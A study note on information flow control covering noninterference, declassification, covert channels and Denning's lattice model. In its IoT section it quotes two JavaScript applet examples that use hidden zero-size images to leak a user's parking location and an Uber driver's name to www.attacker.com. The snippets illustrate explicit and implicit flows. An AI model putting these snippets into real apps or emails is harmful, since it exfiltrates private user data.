# 🧑🏻‍🦽‍➡️ Information Flow & Information Flow Control (IFC)

[TOC]



## Res
### Related Topics
↗ [Information Theory](../../../../../../../../🧮%20Mathematics/🥸%20Information%20Theory/Information%20Theory.md)

↗ [Lattice (Order Theory)](../../../../../../../../🧮%20Mathematics/🤼‍♀️%20Mathematical%20Logic%20(Foundations%20of%20Mathematics)/🛒%20Set%20Theory%20&%20Axiomatic%20Set%20Theory/👬%20Relation%20&%20Relation%20Theory/Partial%20Order%20&%20Order%20Theory/Lattice%20(Order%20Theory)/Lattice%20(Order%20Theory).md)

↗ [Cryptology & Secure Communication](../../../../../../🚬%20Cryptology%20&%20Secure%20Communication/Cryptology%20&%20Secure%20Communication.md)
↗ [Cybersecurity Basics & Information Security (InfoSec)](../../../../../Cybersecurity%20Basics%20&%20Information%20Security%20(InfoSec).md)
↗ [Security Protocols & Cryptographic Verification](../../../../../🙇‍♂️%20Formal%20Verification%20(FV)%20&%20Reasoning%20Systems%20(Formal%20Methods)/Security%20Protocols%20&%20Cryptographic%20Verification/Security%20Protocols%20&%20Cryptographic%20Verification.md)
↗ [Zero-Knowledge Proof (ZKP)](../../../../../🙇‍♂️%20Formal%20Verification%20(FV)%20&%20Reasoning%20Systems%20(Formal%20Methods)/Security%20Protocols%20&%20Cryptographic%20Verification/🍭%20Zero-Knowledge%20Proof%20(ZKP)/Zero-Knowledge%20Proof%20(ZKP).md)

↗ [Access Control (访问控制)](../../../../../../⛈️%20Risk%20Management%20(In%20Cyberspace)/🐺%20Risk%20Countermeasures%20&%20Security%20Control/Identity%20&%20Access%20Management%20(IAM)/Access%20Control%20(访问控制)/Access%20Control%20(访问控制).md)


### Other Resources
[南大软分课程笔记｜13 静态分析在安全领域的应用](https://blog.wohin.me/posts/nju-program-analysis-13/)



## Intro: Information Flow Security (信息流安全)
> [!Abstract]
> IFC studies **how information flows** between the different variables in a program $P$.
> - A variable $x$ could be a data variable, a file, the execution time of $P$, etc.
> 
> Basic Types of Flows
> - **Explicit flows**  
> 	- e.g., in $y := x + 1$, information flows from $x$ to $y$.
> - **Implicit flows**  
>   e.g., in $\text{if } x > 0 \text{ then } y := 1 \text{ else } y := 2,$ information flows from $x$ to $y$.
> 
> **Security Policies**
> Security policies specify the desired flows.  
> 
> **Enforcement Mechanism**
> An enforcement mechanism scans the program and detects if there is any information flow that violates the given security policy.
> - Dennings' approach (lattice)
> - Volpano's approach (type system)
> - Myers' approach (lattice)
> 
> > 🤖 GPT-5.3
> > https://chatgpt.com/share/69e740ba-8ff8-838c-bd32-66b1be212bfe
> 
> ```tikz
> \usetikzlibrary{arrows.meta,positioning}
> \begin{document}
> \begin{tikzpicture}[
>     node distance=0.9cm,
>     >=Latex,
>     font=\small,
>     box/.style={
>         rounded corners=5pt,
>         draw,
>         thick,
>         align=center,
>         minimum width=8.5cm,
>         inner sep=6pt
>     },
>     sem/.style={box, fill=blue!12, draw=blue!60!black},
>     prop/.style={box, fill=green!12, draw=green!50!black},
>     policy/.style={box, fill=orange!18, draw=orange!70!black},
>     enforce/.style={box, fill=red!10, draw=red!65!black},
>     lbl/.style={font=\scriptsize\itshape, text=black!70}
> ]
> 
> \node[sem] (sem) {\textbf{Semantic Models}\\
> Trace semantics $\bullet$ Bisimulation $\bullet$ Knowledge-based models};
> 
> \node[prop, below=of sem] (prop) {\textbf{Security Properties}\\
> Observational equivalence $\bullet$ Noninterference};
> 
> \node[policy, below=of prop] (policy) {\textbf{Policy Models / Frameworks}\\
> Denning's Lattice Model $\bullet$ Myers' Decentralized Label Model (DLM)};
> 
> \node[enforce, below=of policy] (enforce) {\textbf{Enforcement Mechanisms}\\
> Type systems $\bullet$ Static analysis $\bullet$ Runtime enforcement};
> 
> \draw[->, thick] (sem) -- node[right, lbl] {define} (prop);
> \draw[->, thick] (prop) -- node[right, lbl] {structured by} (policy);
> \draw[->, thick] (policy) -- node[right, lbl] {enforced by} (enforce);
> 
> \node[below=0.4cm of enforce, align=center, font=\scriptsize, text=black!75] {
> Examples: Volpano-Smith-Irvine, Jif, NSU, permissive-upgrade, privatization inference
> };
> 
> \end{tikzpicture}
> \end{document}
> ```

> 🔗 https://blog.wohin.me/posts/nju-program-analysis-13/

[Dorothy E. Denning](https://en.wikipedia.org/wiki/Dorothy_E._Denning)于1976年在论文 [_A Lattice Model of Secure Information Flow_](https://courses.cs.washington.edu/courses/cse590s/02sp/secure-information-flow.pdf) 提出，一个系统需要访问（access）和流（flow）控制来满足所有安全要求。

访问控制（access control）用来确保程序有权限访问特定信息，主要关心**信息是如何被访问**的。

信息流安全则是一种端到端的思路，通过追踪信息流通过一个程序的过程，确保该程序能够安全地处理信息，主要关心**信息是如何被传播**的。

Dorothy E. Denning与Peter J. Denning夫妇二人1977年的论文 [_Certification of Programs for Secure Information Flow_](https://www.cs.utexas.edu/~shmat/courses/cs380s/denning.pdf )对信息流做了如下解释：如果变量$x$中的信息被传送到变量$y$，它们之间就建立了一条信息流 $x\to y$。这看起来与我们前面学过的指针分析十分相似。

一种将信息流和安全联系起来的思路是，将不同类型的变量划分到不同的安全等级（security levels），在这些等级之间建立允许的流，从而形成信息流策略。不同实际场景下的安全等级千差万别，可以很复杂也可以很简单。考虑最简单的情况：只有H（高）和L（低）两个安全等级，下面两行代码就分别对应了这两个等级：

```java
h = getPassword(); // h is high security
broadcast(l); // l is low security
```

另外，我们也可以在格（lattice）上对安全等级进行建模（来自前面提到的第一篇论文）：$L\leq H_L \leq H$。

所谓“信息流策略”，用来限制信息流在不同安全等级之间的流动。例如，J. A. Goguen和J. Meseguer于1982年在论文 [_Security Policies and Security Models_](https://www.cs.purdue.edu/homes/ninghui/readings/AccessControl/goguen_meseguer_82.pdf) 中提出了一个信息流策略——不干涉策略（noninterference policy），它要求高安全等级的变量中的信息不应对低安全等级的变量中的信息有任何影响。因此，你也不应该能通过观察低安全等级的变量来获得任何高安全等级的信息。对应到代码上，形如$x_L=y_H$这样的语句就违背了这一信息流策略。

在格的视角下，上述策略可以表达为，应确保信息在安全等级的格中向上流动。

> 🔗 https://en.wikipedia.org/wiki/Information_flow_(information_theory)

**Information flow** in an [information theoretical](https://en.wikipedia.org/wiki/Information_theory "Information theory") context is the transfer of information from a [variable](https://en.wikipedia.org/wiki/Random_variable "Random variable") x to a variable y in a given [process](https://en.wikipedia.org/wiki/Stochastic_process "Stochastic process"). Not all flows may be desirable; for example, a system should not leak any confidential information (partially or not) to public observers—as it is a violation of privacy on an individual level, or might cause major loss on a corporate level.

> [!TIP]
> 🤖 GPT-5.3
> https://chatgpt.com/share/69e740ba-8ff8-838c-bd32-66b1be212bfe
> 
> ```tikz
> \usetikzlibrary{arrows.meta,positioning}
> \begin{document}
> \begin{tikzpicture}[
>     font=\scriptsize,
>     >=Latex,
> 
>     box/.style={
>         draw,
>         thick,
>         rounded corners=4pt,
>         align=center,
>         inner sep=4pt
>     },
>     main/.style={
>         box,
>         minimum width=5.6cm,
>         minimum height=0.8cm
>     },
>     sem/.style={main, fill=blue!10, draw=blue!60!black},
>     prop/.style={main, fill=green!10, draw=green!50!black},
>     policy/.style={main, fill=orange!15, draw=orange!70!black},
>     enforce/.style={main, fill=red!10, draw=red!65!black},
> 
>     sub/.style={
>         draw,
>         thick,
>         rounded corners=4pt,
>         align=left,
>         inner sep=4pt,
>         text width=4.1cm
>     },
>     semsub/.style={sub, fill=blue!5, draw=blue!40!black},
>     propsub/.style={sub, fill=green!5, draw=green!35!black},
>     policysub/.style={sub, fill=orange!8, draw=orange!55!black},
>     enfsub/.style={sub, fill=red!5, draw=red!45!black},
> 
>     lbl/.style={font=\tiny\itshape, text=black!70},
>     note/.style={font=\tiny, text=black!75, align=center}
> ]
> 
> % =========================================================
> % Main vertical spine
> % =========================================================
> \node[sem] (semantic) at (0,0) {\textbf{Semantic Foundations}};
> \node[prop] (security) at (0,-6.8) {\textbf{Security Properties}};
> \node[policy] (policy) at (0,-11.8) {\textbf{Policy Models / Frameworks}};
> \node[enforce] (enforcement) at (0,-16.9) {\textbf{Enforcement Mechanisms}};
> 
> \draw[->, thick] (semantic) -- node[right, lbl] {define} (security);
> \draw[->, thick] (security) -- node[right, lbl] {structured by} (policy);
> \draw[->, thick] (policy) -- node[right, lbl] {enforced by} (enforcement);
> 
> % =========================================================
> % Semantic Foundations
> % =========================================================
> \node[semsub] (sem_models) at (-2.9,-1.6) {
> \textbf{Semantic Models}\\
> -- Trace semantics\\
> -- Bisimulation\\
> -- Knowledge-based security
> };
> 
> \node[semsub] (sem_core) at (2.9,-1.6) {
> \textbf{Core}\\
> -- Observational equivalence\\
> -- Noninterference
> };
> 
> \node[semsub] (sem_variants) at (-2.9,-4.0) {
> \textbf{Variants}\\
> -- Termination-sensitive /\\
> \hspace*{1em}insensitive NI\\
> -- Timing / side-channel NI
> };
> 
> \node[semsub] (sem_relax) at (2.9,-4.0) {
> \textbf{Relaxations}\\
> -- Declassification\\
> -- What / Who / Where / When\\
> -- Robust declassification
> };
> 
> \node[semsub, text width=8.9cm, align=center] (sem_adv) at (0,-5.7) {
> \textbf{Advanced}\\
> -- Hyperproperties
> };
> 
> \draw[dashed, thick, blue!50!black] (semantic.south west) .. controls +(-0.2,-0.5) and +(0,0.35) .. (sem_models.north);
> \draw[dashed, thick, blue!50!black] (semantic.south east) .. controls +(0.2,-0.5) and +(0,0.35) .. (sem_core.north);
> \draw[dashed, thick, blue!50!black] (semantic.south west) .. controls +(-0.45,-1.2) and +(0,0.35) .. (sem_variants.north);
> \draw[dashed, thick, blue!50!black] (semantic.south east) .. controls +(0.45,-1.2) and +(0,0.35) .. (sem_relax.north);
> \draw[dashed, thick, blue!50!black] (semantic.south) -- (sem_adv.north);
> 
> % =========================================================
> % Security Properties
> % =========================================================
> \node[propsub] (sec_obs) at (-2.9,-8.3) {
> \textbf{Relational basis}\\
> -- Observational equivalence\\
> -- indistinguishability
> };
> 
> \node[propsub] (sec_nonint) at (2.9,-8.3) {
> \textbf{Baseline property}\\
> -- Noninterference
> };
> 
> \node[propsub, text width=8.9cm, align=center] (sec_decl) at (0,-10.0) {
> \textbf{Relaxed properties}\\
> -- Declassification\\
> -- Robust declassification
> };
> 
> \draw[dashed, thick, green!50!black] (security.south west) .. controls +(-0.2,-0.5) and +(0,0.35) .. (sec_obs.north);
> \draw[dashed, thick, green!50!black] (security.south east) .. controls +(0.2,-0.5) and +(0,0.35) .. (sec_nonint.north);
> \draw[dashed, thick, green!50!black] (security.south) -- (sec_decl.north);
> 
> % =========================================================
> % Policy Models
> % =========================================================
> \node[policysub] (pol_denning) at (-2.9,-13.3) {
> \textbf{Denning's Lattice Model}\\
> -- labels / security classes\\
> -- partial order / lattice\\
> -- allowed flows via $L_1 \sqsubseteq L_2$
> };
> 
> \node[policysub] (pol_myers) at (2.9,-13.3) {
> \textbf{Myers' DLM}\\
> -- owner / reader policies\\
> -- decentralized ownership\\
> -- authority \& declassification
> };
> 
> \draw[dashed, thick, orange!70!black] (policy.south west) .. controls +(-0.2,-0.5) and +(0,0.35) .. (pol_denning.north);
> \draw[dashed, thick, orange!70!black] (policy.south east) .. controls +(0.2,-0.5) and +(0,0.35) .. (pol_myers.north);
> 
> % =========================================================
> % Enforcement
> % =========================================================
> \node[enfsub] (enf_static) at (-2.9,-18.4) {
> \textbf{Static enforcement}\\
> -- Volpano--Smith--Irvine\\
> -- Jif (DLM-based)\\
> -- program analysis
> };
> 
> \node[enfsub] (enf_dynamic) at (2.9,-18.4) {
> \textbf{Dynamic enforcement}\\
> -- Na\"ive approach\\
> -- NSU\\
> -- Permissive-upgrade\\
> -- Privatization inference
> };
> 
> \node[enfsub, text width=8.9cm, align=center] (enf_hybrid) at (0,-20.2) {
> \textbf{Hybrid / mixed approaches}
> };
> 
> \draw[dashed, thick, red!60!black] (enforcement.south west) .. controls +(-0.2,-0.5) and +(0,0.35) .. (enf_static.north);
> \draw[dashed, thick, red!60!black] (enforcement.south east) .. controls +(0.2,-0.5) and +(0,0.35) .. (enf_dynamic.north);
> \draw[dashed, thick, red!60!black] (enforcement.south) -- (enf_hybrid.north);
> 
> % =========================================================
> % Cross-links, kept minimal and outside
> % =========================================================
> \draw[->, dashed, thick, gray!70]
>     (sem_models.west) .. controls +(-1.5,0) and +(-1.5,0) ..
>     node[left, lbl, pos=0.55] {formalize}
>     (sec_obs.west);
> 
> \draw[->, dashed, thick, gray!70]
>     (sec_obs.east) .. controls +(1.4,0) and +(-1.4,0) ..
>     node[above, lbl, pos=0.5] {underlies}
>     (sec_nonint.west);
> 
> \draw[->, dashed, thick, gray!70]
>     (sem_relax.east) .. controls +(1.5,0) and +(1.5,0) ..
>     node[right, lbl, pos=0.55] {realized by}
>     (pol_myers.east);
> 
> \draw[->, dashed, thick, gray!70]
>     (pol_denning.west) .. controls +(-1.5,0) and +(-1.5,0) ..
>     node[left, lbl, pos=0.55] {encoded by}
>     (enf_static.west);
> 
> % =========================================================
> % Bottom note
> % =========================================================
> \node[note] at (0,-21.6) {
> \textbf{Reading order:}
> semantic models define program meaning;
> security properties define what it means to be secure;
> policy models structure allowed flows;
> enforcement mechanisms check them conservatively.
> };
> 
> \end{tikzpicture}
> \end{document}
> ```


### Security Properties of Information
> [!links]
> ↗ [Cybersecurity Basics & Information Security (InfoSec)](../../../../../Cybersecurity%20Basics%20&%20Information%20Security%20(InfoSec).md) "🛡️ InfoSec Objectives"
> ↗ [Cryptology & Secure Communication](../../../../../../🚬%20Cryptology%20&%20Secure%20Communication/Cryptology%20&%20Secure%20Communication.md) "Objective of Cryptology /Secure Communication & Cryptographic Properties ⭐ "
> 
> ↗ [Core Cryptographic Properties Threats & Countermeasures](../../../../../../⛈️%20Risk%20Management%20(In%20Cyberspace)/🐗%20Cybersecurity%20Threats%20&%20Attacks/Cryptographic%20Properties%20&%20Security/Core%20Cryptographic%20Properties%20Threats%20&%20Countermeasures.md)

> 🔗 https://blog.wohin.me/posts/nju-program-analysis-13/

众所周知，信息安全三要素包括机密性（confidentiality）、完整性（integrity）和可用性（availability）。本节课讨论的是信息流，因此重点关注前两个要素。

确保机密性，通俗意义上就是阻止敏感信息泄露；确保完整性，就是避免不受信的信息污染了受信（重要）的信息（这一说法来自Ken Biba于1977年发表的论文 [_Integrity Considerations for Secure Computer Systems_](https://apps.dtic.mil/sti/pdfs/ADA039324.pdf)）。常见的各种注入问题就是损害了完整性。

有意思的是，结合前面讨论的安全等级相关的知识来看，机密性和完整性恰好是对称的：确保机密性，就是要避免高安全等级的秘密信息流向低安全等级的公开区域，属于读保护；确保完整性，就是要避免低安全等级的不可信信息流向高安全等级的可信区域，属于写保护。

另外，完整性本身也是一个覆盖广泛的概念。它可以包括数据的正确性（correctness）、完全性（completeness）和一致性（consistency）。


### Explicit Flows and Side (Covert) Channels
> [!links]
> ↗ [Side-Channel Attack (SCA)](../../../../../🪖%20Hardware%20Security/Hardware%20Threats%20&%20Attacks/Side-Channel%20Attack%20(SCA)/Side-Channel%20Attack%20(SCA).md)

> 🔗 https://blog.wohin.me/posts/nju-program-analysis-13/

我们继续来讨论信息流。“信息”本身是一个抽象的概念，它并不等同于数据。信息可能会有两种不同的传播方式：显式流和隐式流（implicit flow）。

前者很简单，例如$x_L=y_H$​这个语句就是通过直接复制/赋值的方式实现信息传递，也就是显式流。隐式流则不那么直观，基于此途径的敏感信息泄露也相对而言不那么好防御。现实中已经有许多这样的例子。例如，在下面的代码片段中，根据$publik_L$的结果，我们将能够推断$secret_H$的正负性：

```java
secret_H = getSecret();
if (secret_H < 0) publik_L = 1;
else publik_L = 0;
```

敏感信息虽然没有直接传播，但是它影响了控制流，这可能会被低安全等级的观察者观察到。

通过计算系统传递信息的机制被称作信道（channels）。在此基础上，Butler W.Lampson于1973年发表的文章 [_A Note on the Confinement Problem_](https://www.cs.utexas.edu/~shmat/courses/cs380s_fall09/lampson73.pdf)将那些利用本非用于信息传递的机制的信道称为隐蔽信道。一些常见的隐蔽信道包括：
- 隐式流，通过程序控制结构传递信息。
- 终止（termination）信道，通过程序的（不）可终止性差异传递信息。
- 时间（timing）信道，通过计算时间的差异传递信息。
- 异常（exceptions），通过异常来传递信息。

尽管隐蔽信道比较难识别和防御，它能够传递的信息通常也比显式流少得多。因此，本课程主要关注显式流。一个问题是，如何检测和避免非预期的信息流呢？接下来将要讨论的污点分析是有效的解决方案之一。

> 🔗 https://en.wikipedia.org/wiki/Information_flow_(information_theory)#Explicit_flows_and_side_channels

Information flows can be divided in two major categories. The simplest one is explicit flow, where some secret is explicitly leaked to a publicly observable variable. In the following example, the secret in the variable _h_ flows into the publicly observable variable _l_.
```
var l, h
l := h
```

The other flows fall into the [side channel](https://en.wikipedia.org/wiki/Side_channel_attack "Side channel attack") category. For example, in the [timing attack](https://en.wikipedia.org/wiki/Timing_attack "Timing attack") or in the [power analysis attack](https://en.wikipedia.org/wiki/Power_analysis "Power analysis"), the system leaks information through, respectively, the time or power it takes to perform an action depending on a secret value.

In the following example, the attacker can deduce if the value of _h_ is one or not by the time the program takes to finish:
```
var l, h
if h = 1 then
    (* do some time-consuming work *)
l := 0
```

Another side channel flow is the implicit information flow, which consists in leakage of information through the program [control flow](https://en.wikipedia.org/wiki/Control_flow "Control flow"). The following program (implicitly) discloses the value of the secret variable _h_ to the variable _l_. In this case, since the _h_ variable is boolean, all the bits of the variable of _h_ is disclosed (at the end of the program, _l_ will be 3 if _h_ is true, and 42 otherwise).

```
var l, h
if h = true then
    l := 3
else
    l := 42
```

> [!Abstract] A introducing example
> 
> 📄 Bastys, Iulia, Musard Balliu, and Andrei Sabelfeld. "If this then what? Controlling flows in IoT apps." _Proceedings of the 2018 ACM SIGSAC conference on computer and communications security_. 2018.
> 
> IoT apps empower users by connecting a variety of otherwise unconnected services. These apps (or applets) are triggered by external information sources to perform actions on external information sinks. We demonstrate that the popular IoT app platforms, including IFTTT (If This Then That), Zapier, and Microsoft Flow are susceptible to attacks by malicious applet makers, including stealthy privacy attacks to exfiltrate private photos, leak user location, and eavesdrop on user input to voice-controlled assistants. We study a dataset of 279,828 IFTTT applets from more than 400 services, classify the applets according to the sensitivity of their sources, and find that 30% of the applets may violate privacy. We propose two countermeasures for short- and longterm protection: access control and information flow control. For short-term protection, we suggest that access control classifies an applet as either exclusively private or exclusively public, thus breaking flows from private sources to sensitive sinks. For longterm protection, we develop a framework for information flow tracking in IoT apps. The framework models applet reactivity and timing behavior, while at the same time faithfully capturing the subtleties of attacker observations caused by applet output. We show how to implement the approach for an IFTTT-inspired setting leveraging state-of-the-art information flow tracking techniques for JavaScript based on the JSFlow tool and evaluate its effectiveness on a collection of applets.
> 
> > [!Example] Example: Automatically get an email every time you park your car with a map where you're parked.  
> > 
> > ```javascript  
> > var loc = encodeURIComponent(ParkLocationURL)  
> > var attack = '<img src=\"www.attacker.com?' + loc + '\" style=\"width:0px;height:0px;\">'  
> > var ifttt_logo = '<img src=\"www.ifttt.com/logo.png\" style=\"width:100px;height:100px;\">' 
> >   
> > Email.sendEmail.setBody('I parked at ' + loc + ifttt_logo + attack)
> > ```
> > 
> > Example of <span style="color:red;">Explicit Information Flow</span>: the sensitive information <span style="color:blue;">loc</span> has been <span style="color:red;">leaked</span> to <span style="color:red;">www.attacker.com</span>.
> 
> 
> > [!Example] Another example: After an Uber ride get a trip map:  
> >   
> > ```javascript  
> > var rideMap = Uber.rideCompleted.TripMapImage  
> > var driver = Uber.rideCompleted.DriverName  
> >   
> > for (i = 0; i < driver.len; i++){  
> >   for (j = 32; j < 127; j++){  
> >     t = driver[i] == String.fromCharCode(j)  
> >     if (t){ dst[i] = String.fromCharCode(j) }  
> >   }  
> > }  
> >   
> > var img = '<img src=\"https://attacker.com?' + dst + '\" style=\"width:0px;height:0px;\">'  
> >   
> > Email.sendEmail.setBody(rideMap + img)
> > 
> > ```
> > 
> > Example of <span style="color:red;">Implicit Information Flow</span>: the sensitive information <span style="color:blue;">driver</span> has been leaked to <span style="color:red;">www.attacker.com</span> —  <span style="color:blue;">without copying the sensitive value into any variable that the attacker learned.</span>


### Data Flow Analysis 🆚 Information Flow Analysis 🆚 Taint Analysis
#data_flow_analysis #information_flow_analysis #taint_analysis #infoSec 

> 🤖 GPT-5.3
> https://chatgpt.com/share/69e65fac-a358-8387-be0c-b2d19509f87a
> https://chatgpt.com/share/69e68013-9728-8389-a2f5-fea86da95973

If you remember only one thing:
- **Data flow analysis** → _Where does data go?_
- **Information flow analysis** → _Does sensitive info leak?_
- **Taint analysis** → _Can attacker input reach dangerous code?_

|Concept|Nature|Role|
|---|---|---|
|Data flow analysis|Domain + technique (overloaded)|Tracks value movement|
|Information flow analysis|Domain (security)|Tracks _security-relevant_ flow|
|Taint analysis|Technique|Practical approximation of IFC|

Data flow and information flow are parallel analysis domains.  
Information flow analysis often uses dataflow techniques.  
Taint analysis is a practical technique that sits at the intersection of both.

Key difference

```
x = y;
```
- Data flow: ✔ (value flows)
- Information flow: ✔ (information flows)

```
if (secret) {  
    public = 1;  
}
```
- Data flow: ❌ (no value dependency)
- Information flow: ✔ (implicit flow)



## 🎯 Semantic Foundations /Information Flow Policies
> [!links]
> ↗ [Cybersecurity Basics & Information Security (InfoSec)](../../../../../Cybersecurity%20Basics%20&%20Information%20Security%20(InfoSec).md)
> ↗ [Core Cryptographic Properties Threats & Countermeasures](../../../../../../⛈️%20Risk%20Management%20(In%20Cyberspace)/🐗%20Cybersecurity%20Threats%20&%20Attacks/Cryptographic%20Properties%20&%20Security/Core%20Cryptographic%20Properties%20Threats%20&%20Countermeasures.md)
> ↗ [Other Cryptographic Properties Threats & Countermeasures](../../../../../../⛈️%20Risk%20Management%20(In%20Cyberspace)/🐗%20Cybersecurity%20Threats%20&%20Attacks/Cryptographic%20Properties%20&%20Security/Other%20Cryptographic%20Properties%20Threats%20&%20Countermeasures.md)


### Observational Equivalence
> 🔗 https://en.wikipedia.org/wiki/Observational_equivalence

**Observational equivalence** is the property of two or more underlying entities being indistinguishable on the basis of their [observable](https://en.wikipedia.org/wiki/Observable "Observable") implications. Thus, for example, two [scientific theories](https://en.wikipedia.org/wiki/Scientific_theory "Scientific theory") are observationally equivalent if all of their [empirically](https://en.wikipedia.org/wiki/Empirical "Empirical") [testable](https://en.wikipedia.org/wiki/Testable "Testable") predictions are identical, in which case empirical evidence cannot be used to distinguish which is closer to being correct; indeed, it may be that they are actually two different perspectives on one underlying theory.

In [econometrics](https://en.wikipedia.org/wiki/Econometrics "Econometrics"), two parameter values (or two _structures,_ from among a class of statistical models) are considered observationally equivalent if they both result in the same [probability distribution](https://en.wikipedia.org/wiki/Probability_distribution "Probability distribution") of observable data.[1](https://en.wikipedia.org/wiki/Observational_equivalence#cite_note-palgrave-1)[2](https://en.wikipedia.org/wiki/Observational_equivalence#cite_note-nber-2)[3](https://en.wikipedia.org/wiki/Observational_equivalence#cite_note-koopmans-3) This term often arises in relation to the [identification problem](https://en.wikipedia.org/wiki/Parameter_identification_problem "Parameter identification problem").

In [macroeconomics](https://en.wikipedia.org/wiki/Macroeconomics "Macroeconomics"), it happens when you have multiple structural models, with different interpretation, but indistinguishable empirically. "the mapping between structural parameters and the objective function may not display a unique minimum."[4](https://en.wikipedia.org/wiki/Observational_equivalence#cite_note-science_direct-4)

In the [formal semantics of programming languages](https://en.wikipedia.org/wiki/Formal_semantics_of_programming_languages "Formal semantics of programming languages"), two [terms](https://en.wikipedia.org/wiki/Term_\(logic\) "Term (logic)") _M_ and _N_ are observationally equivalent if and only if, in all contexts _C_\[...\] where _C_\[_M_\] is a valid term, it is the case that _C_\[_N_\] is also a valid term with the same value.[5](https://en.wikipedia.org/wiki/Observational_equivalence#cite_note-foldoc-5) Thus it is not possible, within the system, to distinguish between the two terms. This definition can be made precise only with respect to a particular calculus, one that comes with its own specific definitions of _term_, _context_, and the _value of a term_. The notion is due to [James H. Morris](https://en.wikipedia.org/wiki/James_H._Morris "James H. Morris"),[6](https://en.wikipedia.org/wiki/Observational_equivalence#cite_note-6) who called it "extensional equivalence."


### 1️⃣ Noninterference Policy
> 🔗 https://en.wikipedia.org/wiki/Non-interference_(security)

Non-interference is a policy that enforces that an attacker should not be able to distinguish two computations from their outputs if they only vary in their secret inputs. However, this policy is too strict to be usable in realistic programs.[4] The classic example is a password checker program that, in order to be useful, needs to disclose some secret information: whether the input password is correct or not (note that the information that an attacker learns in case the program rejects the password is that the attempted password is not the valid one).
#### Termination-sensitive vs -insensitive Noninterference  

#### Timing / Side-channel Sensitive Noninterference  


### 2️⃣ Relaxations of Noninterference
#### Declassification⭐
> [!links]
> ↗ [Authentication (身份鉴别)](../../../../../../⛈️%20Risk%20Management%20(In%20Cyberspace)/🐺%20Risk%20Countermeasures%20&%20Security%20Control/Identity%20&%20Access%20Management%20(IAM)/Access%20Control%20(访问控制)/Authentication%20(身份鉴别)/Authentication%20(身份鉴别).md) "authentication factors"

> 🔗 https://en.wikipedia.org/wiki/Information_flow_(information_theory)#Declassification

As shown previously, ==non-interference policy is too strict for use in most real-world applications.==[7] Therefore, several approaches to allow controlled releases of information have been devised. Such approaches are called information declassification.

Robust declassification requires that an active attacker may not manipulate the system in order to learn more secrets than what passive attackers already know.[4]

Information declassification constructs can be classified in four orthogonal dimensions: what information is released, who is authorized to access the information, where the information is released, and when the information is released.[4]
##### What
> 🔗 https://en.wikipedia.org/wiki/Information_flow_(information_theory)#Declassification

A _what_ declassification policy controls which information (partial or not) may be released to a publicly observable variable.

The following code example shows a **declassify** construct from.[8](https://en.wikipedia.org/wiki/Information_flow_\(information_theory\)#cite_note-sabelfeld04-8) In this code, the value of the variable _h_ is explicitly allowed by the programmer to flow into the publicly observable variable _l_.

```
var l, h
if l = 1 then
    l := declassify(h)
```
##### Who
> 🔗 https://en.wikipedia.org/wiki/Information_flow_(information_theory)#Declassification

A _who_ declassification policy controls which [principals](https://en.wikipedia.org/wiki/Security_principal "Security principal") (i.e., who) can access a given piece of information. This kind of policy has been implemented in the Jif compiler.[9](https://en.wikipedia.org/wiki/Information_flow_\(information_theory\)#cite_note-9)

The following example allows Bob to share its secret contained in the variable _b_ with Alice through the commonly accessible variable _ab_.

```
var ab                                (* {Alice, Bob} *)
var b                                 (* {Bob} *)
if ab = 1 then
    ab := declassify(b, {Alice, Bob}) (* {Alice, Bob} *)
```
##### Where
> 🔗 https://en.wikipedia.org/wiki/Information_flow_(information_theory)#Declassification

A _where_ declassification policy regulates where the information can be released, for example, by controlling in which lines of the [source code](https://en.wikipedia.org/wiki/Source_code "Source code") information can be released.

The following example makes use of the **flow** construct proposed in.[10](https://en.wikipedia.org/wiki/Information_flow_\(information_theory\)#cite_note-matos05-10) This construct takes a flow policy (in this case, variables in H are allowed to flow to variables in L) and a command, which is run under the given flow policy.

```
var l, h
flow H ≺ L in
    l := h
```
##### When
> 🔗 https://en.wikipedia.org/wiki/Information_flow_(information_theory)#Declassification

A _when_ declassification policy regulates when the information can be released. Policies of this kind can be used to verify programs that implement, for example, controlled release of secret information after payment, or encrypted secrets which should not be released in a certain time given polynomial computational power.
#### Robust Declassification


### Semantic Models 🤔
↗ [Mathematical Modeling & Abstraction](../../../../../../../🧮%20Mathematics/Mathematical%20Modeling%20&%20Abstraction.md)
↗ [Models of Computation & Abstract Machines](../../../../../../../🧮%20Mathematics/🤼‍♀️%20Mathematical%20Logic%20(Foundations%20of%20Mathematics)/😶‍🌫️%20Theory%20of%20Computation/Models%20of%20Computation%20&%20Abstract%20Machines/Models%20of%20Computation%20&%20Abstract%20Machines.md)
↗ [The Essence of Computing - Programs & The Semantics of Programs](../../../../../../../🗺%20CS%20Overview/The%20Essence%20of%20Computing%20-%20Programs%20&%20The%20Semantics%20of%20Programs.md)

↗ [Cryptographic Protocols Modeling & Models of Communication (and Intruder)](../../../../../../🚬%20Cryptology%20&%20Secure%20Communication/🛀%20Cryptographic%20Protocols%20Modeling%20&%20Models%20of%20Communication%20(and%20Intruder)/Cryptographic%20Protocols%20Modeling%20&%20Models%20of%20Communication%20(and%20Intruder).md)
↗ [(Formal) Model Checking](../../../../../🙇‍♂️%20Formal%20Verification%20(FV)%20&%20Reasoning%20Systems%20(Formal%20Methods)/🧳%20(Formal)%20Model%20Checking/(Formal)%20Model%20Checking.md)

- Trace semantics  
- Bisimulation  
- Knowledge-based security (attacker knowledge)  
- etc.


### 3️⃣ Advance
#### Hyperproperties (Clarkson & Schneider)



## 🎯 IFC Policy Models /Security Policy Framework (Semantic)
> [!TIP]
> 
> | Term                 | Meaning                                                                                                |
> | -------------------- | ------------------------------------------------------------------------------------------------------ |
> | **Policy model**     | (the idea) The abstract definition of allowed flows |
> | **Policy framework** | (the idea + mathematical machinery) The model **+ its formal structure + sometimes its usage context** |
> 
> > [!Example] Example: Denning
> > 
> > As a _policy model_
> > > “Information may flow only if labels respect ≤”
> > 
> > As a _policy framework_
> > - Labels
> > - Lattice
> > - Join / meet operations
> > - Flow constraints
> > 
> > 👉 Same thing, just different emphasis.


### Denning's Approach (High & Low Label) & Lattice Model 
> 📄 Denning, Dorothy E., and Peter J. Denning. "Certification of programs for secure information flow." _Communications of the ACM_ 20.7 (1977): 504-513.
#### Basic Idea
There is a set $S$ of **security labels**
- e.g.: $S = \{\text{Low}, \text{High}\}$
The labels are **ordered** $(\sqsubseteq)$
- e.g.: $\text{Low} \sqsubseteq \text{High}$ i.e. Low is smaller than High
A **security policy** assigns a security label to each variable
- e.g.: the variable $x$ is High, the variable $y$ is Low, ...
We have **two operations** $(\sqcup, \sqcap)$ for **combining labels**
- $\sqcup$ the **supremum** (aka **smallest upper bound** aka **join**)
	- e.g.: $\text{Low} \sqcup \text{High} = \text{High}$ (the maximum)
- $\sqcap$ the **infimum** (aka **greatest lower bound** aka **meet**)
